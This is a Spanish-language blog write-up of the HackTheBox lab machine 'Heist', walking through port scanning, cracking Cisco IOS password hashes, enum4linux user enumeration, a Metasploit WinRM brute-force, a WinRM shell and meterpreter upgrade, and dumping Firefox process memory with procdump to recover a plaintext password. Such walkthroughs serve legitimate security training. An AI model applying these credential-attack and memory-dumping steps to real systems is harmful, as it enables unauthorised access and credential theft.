<!DOCTYPE html><html lang="en"><head>
    
      <title>
        [HackTheBox – Heist] Spanish Writeup ::
        jorgectf — blog
      </title>
    
    <meta http-equiv="content-type" content="text/html; charset=utf-8"/>
<meta name="viewport" content="width=device-width, initial-scale=1.0"/>
<meta name="description" content="Heist Spanish Writeup."/>
<meta name="keywords" content=""/>
<meta name="robots" content="noodp"/>
<link rel="canonical" href="https://jorgectf.github.io/blog/post/heist-writeup-spanish/"/>





<link rel="stylesheet" href="https://jorgectf.github.io/blog/assets/style.css"/>

<link rel="stylesheet" href="https://jorgectf.github.io/blog/style.css"/>


<link rel="apple-touch-icon-precomposed" sizes="144x144" href="https://jorgectf.github.io/blog/img/apple-touch-icon-144-precomposed.png"/>
<link rel="shortcut icon" href="https://jorgectf.github.io/blog/img/favicon.png"/>


<link href="https://jorgectf.github.io/blog/assets/fonts/Inter-Italic.woff2" rel="preload" type="font/woff2" as="font" crossorigin=""/>
<link href="https://jorgectf.github.io/blog/assets/fonts/Inter-Regular.woff2" rel="preload" type="font/woff2" as="font" crossorigin=""/>
<link href="https://jorgectf.github.io/blog/assets/fonts/Inter-Medium.woff2" rel="preload" type="font/woff2" as="font" crossorigin=""/>
<link href="https://jorgectf.github.io/blog/assets/fonts/Inter-MediumItalic.woff2" rel="preload" type="font/woff2" as="font" crossorigin=""/>
<link href="https://jorgectf.github.io/blog/assets/fonts/Inter-Bold.woff2" rel="preload" type="font/woff2" as="font" crossorigin=""/>
<link href="https://jorgectf.github.io/blog/assets/fonts/Inter-BoldItalic.woff2" rel="preload" type="font/woff2" as="font" crossorigin=""/>


<meta name="twitter:card" content="summary"/>
<meta name="twitter:title" content="[HackTheBox – Heist] Spanish Writeup"/>
<meta name="twitter:description" content="Heist Spanish Writeup."/>



<meta property="og:title" content="[HackTheBox – Heist] Spanish Writeup"/>
<meta property="og:description" content="Heist Spanish Writeup."/>
<meta property="og:type" content="article"/>
<meta property="og:url" content="https://jorgectf.github.io/blog/post/heist-writeup-spanish/"/><meta property="article:section" content="post"/>
<meta property="article:published_time" content="2019-09-08T18:00:00+00:00"/>
<meta property="article:modified_time" content="2019-09-08T18:00:00+00:00"/><meta property="og:site_name" content="jorgectf"/>







  </head>
  <body class="dark-theme">
    <div class="container">
      <header class="header">
  <span class="header__inner">
    <a href="https://jorgectf.github.io/blog/" class="logo" style="text-decoration: none;">
  
  <img src="https://jorgectf.github.io/blog/logo.png" alt="jorgectf"/>
  
</a>
    <span class="header__right">
      
        <nav class="menu">
  <ul class="menu__inner menu__inner--desktop">
    
    
    
    <li><a href="https://jorgectf.gitbook.io/awae-oswe-preparation-resources/">OSWE Cheatsheet</a></li>
    
    
    
    <li><a href="https://jorgectf.github.io/blog/research/">Research</a></li>
    
    
    <li><a href="../">About</a></li>
    
    
  </ul>

  <ul class="menu__inner menu__inner--mobile">
    
    
    <li><a href="https://jorgectf.gitbook.io/awae-oswe-preparation-resources/">OSWE Cheatsheet</a></li>
    
    
    
    <li><a href="https://jorgectf.github.io/blog/research/">Research</a></li>
    
    
    <li><a href="../">About</a></li>
  </ul>
</nav>
        <span class="menu-trigger">
          <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24">
            <path d="M0 0h24v24H0z" fill="none"></path>
            <path d="M3 18h18v-2H3v2zm0-5h18v-2H3v2zm0-7v2h18V6H3z"></path>
          </svg>
        </span>
      
      <span class="theme-toggle">
        <svg class="theme-toggler" width="24" height="24" viewBox="0 0 48 48" fill="none" xmlns="http://www.w3.org/2000/svg">
  <path d="M22 41C32.4934 41 41 32.4934 41 22C41 11.5066 32.4934 3 22
  3C11.5066 3 3 11.5066 3 22C3 32.4934 11.5066 41 22 41ZM7 22C7
  13.7157 13.7157 7 22 7V37C13.7157 37 7 30.2843 7 22Z"></path>
</svg>

      </span>
    </span>
  </span>
</header>


      <div class="content">
        
  
  

  <div class="post">
    <h1 class="post-title">[HackTheBox – Heist] Spanish Writeup</h1>
    <div class="post-meta">
      
        <span class="post-date">
          2019-09-08
        </span>

        
          
        
      

      


      
    </div>

    
      <span class="post-tags">
        
          <a href="https://jorgectf.github.io/blog/tags/hackthebox/">#HackTheBox</a> 
        
          <a href="https://jorgectf.github.io/blog/tags/spanish/">#Spanish</a> 
        
          <a href="https://jorgectf.github.io/blog/tags/espa%C3%B1ol/">#Español</a> 
        
          <a href="https://jorgectf.github.io/blog/tags/writeup/">#Writeup</a> 
        
          <a href="https://jorgectf.github.io/blog/tags/cisco/">#cisco</a> 
        
          <a href="https://jorgectf.github.io/blog/tags/enum4linux/">#enum4linux</a> 
        
          <a href="https://jorgectf.github.io/blog/tags/msf/">#msf</a> 
        
          <a href="https://jorgectf.github.io/blog/tags/procdump/">#procdump</a> 
        
      </span>
    

    

    <div class="post-content">
      
      <p><img src="https://jorgectf.github.io/blog/static/heist/logo.png" alt=""/></p>
<h1 id="valoraciones">Valoraciones:</h1>
<p><img src="https://jorgectf.github.io/blog/static/heist/valoraciones.png" alt=""/></p>
<h1 id="escaneo-de-puertos">Escaneo de puertos:</h1>
<pre tabindex="0"><code>Nmap scan report for 10.10.10.149
PORT STATE SERVICE VERSION
80/tcp open http Microsoft IIS httpd 10.0
| http-cookie-flags:
| /:
| PHPSESSID:
|_ httponly flag not set
| http-methods:
|_ Potentially risky methods: TRACE
|_http-server-header: Microsoft-IIS/10.0
| http-title: Support Login Page
|_Requested resource was login.php
135/tcp open msrpc Microsoft Windows RPC
445/tcp open microsoft-ds?
5985/tcp open http Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
|_http-server-header: Microsoft-HTTPAPI/2.0
|_http-title: Not Found
49668/tcp open msrpc Microsoft Windows RPC
Service Info: OS: Windows; CPE: cpe:/o:microsoft:windows
Host script results:
|clock-skew: mean: -36s, deviation: 0s, median: -36s | smb2-security-mode: | 2.02: | Message signing enabled but not required
| smb2-time:
| date: 2019-08-10 21:04:32
|_ start_date: N/A
</code></pre><h1 id="enumeración">Enumeración</h1>
<p>Accedemos al servidor web y nos topamos con un login.</p>
<p><img src="https://jorgectf.github.io/blog/static/heist/login1.png" alt=""/></p>
<p>Tras probar varias contraseñas comunes sin éxito, entramos como invitado.</p>
<p><img src="https://jorgectf.github.io/blog/static/heist/login2.png" alt=""/></p>
<p>Nos encontramos una conversación entre un cliente (Hazard) con el soporte sobre errores en el router del cliente. Como vemos, el primer mensaje lleva un archivo adjunto.</p>
<pre tabindex="0"><code class="language-version" data-lang="version">no service pad
service password-encryption
!
isdn switch-type basic-5ess
!
hostname ios-1
!
security passwords min-length 12
enable secret 5 $1$pdQG$o8nrSzsGXeaduXrjlvKc91
!
username rout3r password 7 0242114B0E143F015F5D1E161713
username admin privilege 15 password 7 02375012182C1A1D751618034F36415408
!
!
ip ssh authentication-retries 5
ip ssh version 2
!
!
router bgp 100
synchronization
bgp log-neighbor-changes
bgp dampening
network 192.168.0.0Â mask 300.255.255.0
timers bgp 3 9
redistribute connected
!
ip classless
ip route 0.0.0.0 0.0.0.0 192.168.0.1
!
!
access-list 101 permit ip any any
dialer-list 1 protocol ip list 101
!
no ip http server
no ip http secure-server
!
line vty 0 4
session-timeout 600
authorization exec SSH
transport input ss
</code></pre><p>Se trata de un archivo de configuración para un router Cisco IOS donde podemos ver varios posibles usuarios y contraseñas. Tras un rato de investigación, descubrimos que la primera es una contraseña tipo 5 de Cisco IOS, y las dos siguientes son tipo 7. Para la primera será necesaria la fuerza bruta con diccionario (rockyou) y para las dos siguientes hay páginas online que nos las pueden descifrar.</p>
<p><strong>Datos finales de la enumeración web:</strong></p>
<p>[<strong>Usuarios</strong>]: Hazard, Support Admin, rout3r, admin.</p>
<p>[<strong>Contraseñas</strong>]: stealth1agent, $uperP@ssword, Q4)sJu\Y8qz*A3?d.</p>
<p>Como muestra el escaneo de puertos, tambien tiene un servidor Samba corriendo junto con WinRM y RPC. Ya que WinRM necesita credenciales, vamos a ver si podemos conseguir algo más enumerando Samba.</p>
<p>Ejecutando enum4linux vemos cosas interesantes al hacer un check de los SIDs en RPC.</p>
<pre tabindex="0"><code>enum4linux -u hazard -p stealth1agent -a 10.10.10.149

S-1-5-21-4254423774-1266059056-3197185112-1008 SUPPORTDESK\Hazard (Local User)
S-1-5-21-4254423774-1266059056-3197185112-1009 SUPPORTDESK\support (Local User)
S-1-5-21-4254423774-1266059056-3197185112-1012 SUPPORTDESK\Chase (Local User)
S-1-5-21-4254423774-1266059056-3197185112-1013 SUPPORTDESK\Jason (Local User)
</code></pre><h1 id="explotación">Explotación</h1>
<p>Teniendo estos datos usamos Metasploit Framework para hacer un ataque de fuerza bruta a WinRM.</p>
<pre tabindex="0"><code>$ msfconsole

&gt; auxiliary/scanner/winrm/winrm_login
&gt; set RHOSTS 10.10.10.149
&gt; set DOMAIN SUPPORTDESK
&gt; set USER_FILE users.txt
&gt; set PASS_FILE pwds.txt 
</code></pre><p>Tenemos resultado positivo!</p>
<pre tabindex="0"><code>[+] 10.10.10.149:5985 - Login Successful: SUPPORTDESK\Chase:Q4)sJu\Y8qz*A3?d
</code></pre><p>Tras probar estas credenciales para entrar en WinRM a través de Metasploit nos dice que son incorrectas, por lo que vamos a usar algún script que haya por internet para loguearse en WinRM y conseguir acceso a Powershell. Encontramos <a href="https://alionder.net/winrm-shell/" target="_blank">esta</a>: Seguimos los pasos, la configuramos cambiando el usuario y la contraseña, y tenemos acceso!</p>
<h5 id="migramos-a-un-meterpreter-con-exploitmultiscriptweb_delivery-y-ya-tenemos-una-shell-en-condiciones">Migramos a un meterpreter con exploit/multi/script/web_delivery y ya tenemos una shell en condiciones.</h5>
<h1 id="post-explotación">Post-Explotación</h1>
<p>Ejecutando scripts de enumeración en Windows (como LinEnum en Linux)vemos que tenemos muy pocos privilegios en lo relacionado a procesos, por lo que investigamos más a fondo qué está corriendo en el sistema con Get-Process en Powershell.</p>
<p>Después de un rato llegamos a la conclusión de que firefox puede estar abierto porque Chase (nuestro usuario actual) pueda ser el Support Admin que está arreglando el problema de Hazard. (También se encuentra una nota en la carpeta de usuario de Chase en la que apunta cosas relacionadas con esto último.)</p>
<p>Tras investigar un rato sobre cómo dumpear/conseguir información de procesos en Windows, debido a que no tenemos permisos en la consola tenemos que ejecutar <a href="https://docs.microsoft.com/en-us/sysinternals/downloads/procdump" target="_blank">Procdump</a>.</p>
<pre tabindex="0"><code>procdump.exe -ma PID
</code></pre><h5 id="donde-pid-es-el-id-del-proceso-que-queremos-dumpear-en-este-caso-no-lo-he-puesto-porque-no-es-estable">Donde PID es el ID del proceso que queremos dumpear. En este caso no lo he puesto porque no es estable.</h5>
<p>Para acabar, hacemos un strings al .dmp y grepeamos “pasword”, porque lo que queremos es coger la contraseña con la que Chase está logueado en la web.</p>
<pre tabindex="0"><code>strings -a DUMP.dmp | grep password
</code></pre><h5 id="el--a-lo-ponemos-para-que-nos-muestre-el-resultado-en-texto-plano">El -a lo ponemos para que nos muestre el resultado en texto plano.</h5>
<p>Y obtenemos esto:</p>
<pre tabindex="0"><code>localhost/login.php?login_username=admin@support.htb&amp;login_password=4dD!5}x/re8]FBuZ
</code></pre><h5 id="una-petición-post-con-las-credenciales-en-la-url">Una petición POST con las credenciales en la URL.</h5>
<p>Con esta información, usamos el script anterior cambiando las credenciales y…</p>
<p><img src="https://jorgectf.github.io/blog/static/heist/login3.png" alt=""/></p>
<p>Si has llegado hasta aquí, gracias por leerme! Nos vemos en el siguiente Writeup.</p>

    </div>
    
      
        <div class="pagination">
          <div class="pagination__title">
            <span class="pagination__title-h">Read other posts</span>
            <hr/>
          </div>
          <div class="pagination__buttons">
            
              <span class="button previous">
                <a href="https://jorgectf.github.io/blog/post/networked-writeup-spanish./">
                  <span class="button__icon">←</span>
                  <span class="button__text">[HackTheBox – Networked] Spanish Writeup</span>
                </a>
              </span>
            
            
          </div>
        </div>
      
    

    
      
        

<script src="https://unpkg.com/shiki"></script>

<script>
    if (document.querySelector("code[data-lang*='ql']")) {
        shiki
            .getHighlighter({
                theme: 'github-dark',
                langs: [
                    {
                        id: 'codeql',
                        scopeName: 'source.ql',
                        path: '/languages/codeql.tmLanguage.json',
                        samplePath: 'codeql.sample',
                        aliases: ['ql']
                    }
                ]
            })
            .then(highlighter => {
                for (codeElement of document.querySelectorAll("code[data-lang]")) {
                    try {
                        let prev = codeElement.textContent
                        let code = highlighter.codeToHtml(prev, { lang: codeElement.dataset.lang.toString() })
                        codeElement.parentNode.innerHTML = code
                    } catch(err) {
                        console.log(err)
                    }
                }
                for (shikiElement of document.querySelectorAll("pre[class='shiki']")) {
                    shikiElement.parentNode.parentNode.replaceChild(
                        shikiElement, shikiElement.parentNode
                    )
                }
            })
    }
</script>
      
    
  </div>

      </div>

      
        <footer class="footer">
  <div class="footer__inner">
    
      <a href="https://jorgectf.github.io/blog/" class="logo" style="text-decoration: none;">
  
  <img src="https://jorgectf.github.io/blog/logo.png" alt="jorgectf"/>
  
</a>
      <div class="copyright">
        <span>© 2022 Powered by
          <a href="https://gohugo.io" target="_blank" rel="noopener">Hugo</a></span>
        <span>Theme created by
          <a href="https://twitter.com/panr" target="_blank" rel="noopener">panr</a></span>
      </div>
    
  </div>
</footer>

<script src="https://jorgectf.github.io/blog/assets/main.js"></script>


      
    </div>

    
  

</body></html>